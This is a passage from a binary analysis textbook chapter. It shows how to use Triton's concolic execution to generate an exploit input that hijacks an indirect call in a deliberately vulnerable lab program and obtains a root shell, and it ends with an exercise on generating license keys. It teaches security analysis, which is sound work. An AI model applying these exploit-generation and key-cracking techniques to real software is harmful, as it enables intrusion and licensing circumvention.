<p class="noindent"><a href="ch13.xhtml#ch13list18">Listing 13-18</a> shows how to use <em>exploit_callsite.py</em> in practice to generate an exploit for the <span class="literal">icall</span> program.</p>&#13;
<p class="listing1" id="ch13list18"><em>Listing 13-18: Trying to find an exploit for</em> <span class="codeitalic">icall</span> <em>with input length 3</em></p>&#13;
<p class="programs"><span class="ent">➊</span> $ <span class="codestrong1">cd ~/triton/pin-2.14-71313-gcc.4.4.7-linux/source/tools/Triton/build</span><br/><span class="ent">➋</span> $ <span class="codestrong1">./triton <span class="ent">➌</span>~/code/chapter13/exploit_callsite.py \</span><br/>             <span class="ent">➍</span><span class="codestrong1">~/code/chapter13/icall 2 AAA</span><br/><span class="ent">➎</span> Symbolized argument 2: AAA<br/>   Symbolized argument 1: 2<br/><span class="ent">➏</span> Calling 0x223c625e<br/><span class="ent">➐</span> Found tainted indirect call site '0x400bef: call rax'<br/><span class="ent">➑</span> Getting model for 0x400bef: call rax -&gt; 0x400b3b<br/>   # no model found</p>&#13;
<p class="indent">First, you navigate to the main Triton directory on the VM, where you’ll find the <span class="literal">triton</span> wrapper script <span class="ent">➊</span>. Recall that Triton provides this wrapper script to automatically handle the required Pin setup for concolic tools. In a <span epub:type="pagebreak" id="page_369"/>nutshell, the wrapper script runs the analyzed program (<span class="literal">icall</span>) in Pin using Triton’s concolic library as the Pintool. That library takes your user-defined concolic tool (<em>exploit_callsite.py</em>) as an argument and takes care of starting the tool.</p>&#13;
<p class="indent">All you need to do to start the analysis is call the <span class="literal">triton</span> wrapper script <span class="ent">➋</span>, passing the name of the <em>exploit_callsite.py</em> script <span class="ent">➌</span> and the name and arguments of the program to analyze (<span class="literal">icall</span> with index 2 and input string <span class="literal">AAA</span>) <span class="ent">➍</span>. The <span class="literal">triton</span> wrapper script now ensures that <span class="literal">icall</span> runs with the given arguments in Pin under control of the <em>exploit_callsite.py</em> script. Note that the input string <span class="literal">AAA</span> is not an exploit but just an arbitrary string to drive the concolic execution.</p>&#13;
<p class="indent">The script intercepts <span class="literal">icall</span>’s <span class="literal">main</span> function and symbolizes all the user input bytes in <span class="literal">argv</span> <span class="ent">➎</span>. When <span class="literal">icall</span> reaches the indirect call site, it uses the address <span class="literal">0x223c625e</span> as the target <span class="ent">➏</span>, which is the hash of <span class="literal">AAA</span>. This is a bogus address that would normally lead to a crash, but in this case it doesn’t matter because <em>exploit_callsite.py</em> computes the exploit model before the indirect call ever executes.</p>&#13;
<p class="indent">When the indirect call is about to execute <span class="ent">➐</span>, <em>exploit_callsite.py</em> tries to find a model that yields a set of user inputs that hash to the call target <span class="literal">0x400b3b</span>, which is the address of the secret admin area <span class="ent">➑</span>. Note that this step may take a while, up to a few minutes depending on your hardware configuration. Unfortunately, the solver is unable to find a model, so <em>exploit_callsite.py</em> stops without finding an exploit.</p>&#13;
<p class="indent">Luckily, this doesn’t necessarily mean that no exploit exists. Recall that you’ve given the concolic execution of <span class="literal">icall</span> the input string <span class="literal">AAA</span> and that <em>exploit_callsite.py</em> creates a separate symbolic variable for each of the three input bytes in that string. As a result, the solver tries to find an exploit model based on a user input string of length 3. Thus, the solver’s inability to find an exploit means only that there’s no input string <em>of length 3</em> that forms a suitable exploit, but you may have more luck for inputs of a different length. Rather than trying every possible input length manually, you can automate this process, as shown in <a href="ch13.xhtml#ch13list19">Listing 13-19</a>.</p>&#13;
<p class="listing1" id="ch13list19"><em>Listing 13-19: Scripting exploit attempts with varying input length</em></p>&#13;
<p class="programs">   <span class="codestrong1">$ cd ~/triton/pin-2.14-71313-gcc.4.4.7-linux/source/tools/Triton/build</span><br/><span class="ent">➋</span> <span class="codestrong1">$ for i in $(seq 1 100); do</span><br/>      <span class="codestrong1">str=`python -c "print 'A'*"${i}`</span><br/>      <span class="codestrong1">echo "Trying input len ${i}"</span><br/><span class="ent">➌</span>    <span class="codestrong1">./triton ~/code/chapter13/exploit_callsite.py ~/code/chapter13/icall 2 ${str} \</span><br/>       <span class="codestrong1">| grep -a SymVar</span><br/>     <span class="codestrong1">done</span><br/><span class="ent">➍</span> Trying input len 1<br/>   Trying input len 2<br/>   Trying input len 3<br/>   Trying input len 4<br/><span class="ent">➎</span> SymVar_0 = 0x24 (argv[2][0])<br/>   SymVar_1 = 0x2A (argv[2][1])<br/><span epub:type="pagebreak" id="page_370"/>&#13;
   SymVar_2 = 0x58 (argv[2][2])<br/>   SymVar_3 = 0x26 (argv[2][3])<br/>   SymVar_4 = 0x40 (argv[2][4])<br/>   SymVar_5 = 0x20 (argv[1][0])<br/>   SymVar_6 = 0x40 (argv[1][1])<br/>   Trying input len 5<br/><span class="ent">➏</span> SymVar_0 = 0x64 (argv[2][0])<br/>   SymVar_1 = 0x2A (argv[2][1])<br/>   SymVar_2 = 0x58 (argv[2][2])<br/>   SymVar_3 = 0x26 (argv[2][3])<br/>   SymVar_4 = 0x3C (argv[2][4])<br/>   SymVar_5 = 0x40 (argv[2][5])<br/>   SymVar_6 = 0x40 (argv[1][0])<br/>   SymVar_7 = 0x40 (argv[1][1])<br/>   Trying input len 6<br/>   <span class="codestrong1">ˆC</span></p>&#13;
<p class="indent">Here, I’ve used a <span class="literal">bash for</span> statement to loop over all integers <em>i</em> between 1 and 100 <span class="ent">➊</span>. In each iteration, the loop creates a string of <em>i</em> letter “A” characters <span class="ent">➋</span> and then tries to generate an exploit with this length-<em>i</em> string as the user input <span class="ent">➌</span>, just like you saw in <a href="ch13.xhtml#ch13list18">Listing 13-18</a> for length 3.<sup><a id="ch13fn_8a" href="footnote.xhtml#ch13fn_8">8</a></sup></p>&#13;
<p class="indent">To reduce clutter in the output, you can use <span class="literal">grep</span> to display only output lines containing the word <em>SymVar</em>. This ensures that the output shows only those lines printed from successful models and that exploit generation attempts that don’t produce a model fail silently.</p>&#13;
<p class="indent">The exploit loop’s output starts at <span class="ent">➍</span>. It fails to find a model for input lengths 1 through 3 but succeeds for length 4 <span class="ent">➎</span> and again for length 5 <span class="ent">➏</span>. I’ve stopped execution after that because there’s no need to try more input lengths when you’ve already found an exploit.</p>&#13;
<p class="indent">Let’s try the first exploit reported in the output (the one with length 4). To translate this output into an exploit string, you concatenate the ASCII characters that the solver assigned to the symbolic variables that correspond to <span class="literal">argv[2][0]</span> through <span class="literal">argv[2][3]</span> since those are the user input bytes used as input for <span class="literal">icall</span>’s hash function. As you can see in <a href="ch13.xhtml#ch13list19">Listing 13-19</a>, the solver chose the values <span class="literal">0x24</span>, <span class="literal">0x2A</span>, <span class="literal">0x58</span>, and <span class="literal">0x26</span> for those bytes, respectively. The byte at <span class="literal">argv[2][4]</span> should be the terminating <span class="literal">NULL</span> of the user input string, but the solver doesn’t know that and so picked the random input byte <span class="literal">0x40</span> for that position, which you can safely ignore.</p>&#13;
<p class="indent">The bytes assigned to <span class="literal">argv[2][0]</span> through <span class="literal">argv[2][3]</span> in the model correspond to the ASCII exploit string <span class="literal">$*X&amp;</span>. Let’s try giving this exploit string as input to <span class="literal">icall</span> in <a href="ch13.xhtml#ch13list20">Listing 13-20</a>.</p>&#13;
<p class="listing1" id="ch13list20"><span epub:type="pagebreak" id="page_371"/><em>Listing 13-20: Exploiting the</em> <span class="codeitalic">icall</span> <em>program</em></p>&#13;
<p class="programs"><span class="ent">➊</span> $ <span class="codestrong1">cd ~/code/chapter13</span><br/><span class="ent">➋</span> $ <span class="codestrong1">./icall 2 '$*X&amp;'</span><br/><span class="ent">➌</span> Calling 0x400b3b<br/><span class="ent">➍</span> <span class="codestrong1"># whoami</span><br/>  root</p>&#13;
<p class="indent">To try the exploit, you navigate back to the code directory for this chapter, where <span class="literal">icall</span> is <span class="ent">➊</span>, and then call <span class="literal">icall</span> with the out-of-bounds index 2 and the just-generated exploit string <span class="ent">➋</span>. As you can see, the exploit string hashes exactly to <span class="literal">0x400b3b</span>, the address of the secret admin area <span class="ent">➌</span>. Thanks to the lack of bounds checking on the function pointer index given by the user, you successfully trick <span class="literal">icall</span> into calling that address and giving you a root shell <span class="ent">➍</span>. As you can see, the command <span class="literal">whoami</span> prints <span class="literal">root</span>, verifying that you’ve obtained a root shell. You’ve automatically generated an exploit using symbolic execution!</p>&#13;
<h3 class="h3" id="ch13_6">13.6 Summary</h3>&#13;
<p class="indent">In this chapter, you learned how to use symbolic execution to build tools that automatically uncover nontrivial information about binary programs. Symbolic execution is one of the most powerful binary analysis techniques, although you have to use it with care to minimize scalability issues. As you’ve seen in the automatic exploitation example, you can further increase the effectiveness of your symbex tools by combining them with other techniques, such as dynamic taint analysis.</p>&#13;
<p class="indent">If you’ve read this book in its entirety, you should now be familiar with a variety of binary analysis techniques that you can use for a wide range of goals, from hacking and security testing to reverse engineering, malware analysis, and debugging. I hope this book has enabled you to work more effectively on your own binary analysis projects and that it’s given you a solid basis from which to continue learning in the field of binary analysis, perhaps even advancing it through your own contributions!</p>&#13;
<div class="box">&#13;
<p class="headbox" id="ch13_7">Exercise</p>&#13;
<p class="boxhead1">1. Generating License Keys</p>&#13;
<p class="noindent">In the code directory for this chapter, you’ll find a program called <em>license.c</em> that takes as input a serial number and checks whether it’s valid (similar to license key checks in commercial software). Make a symbolic execution tool with Triton that can generate valid license keys accepted by <em>license.c</em>.</p>&#13;
</div>&#13;
</div></body></html>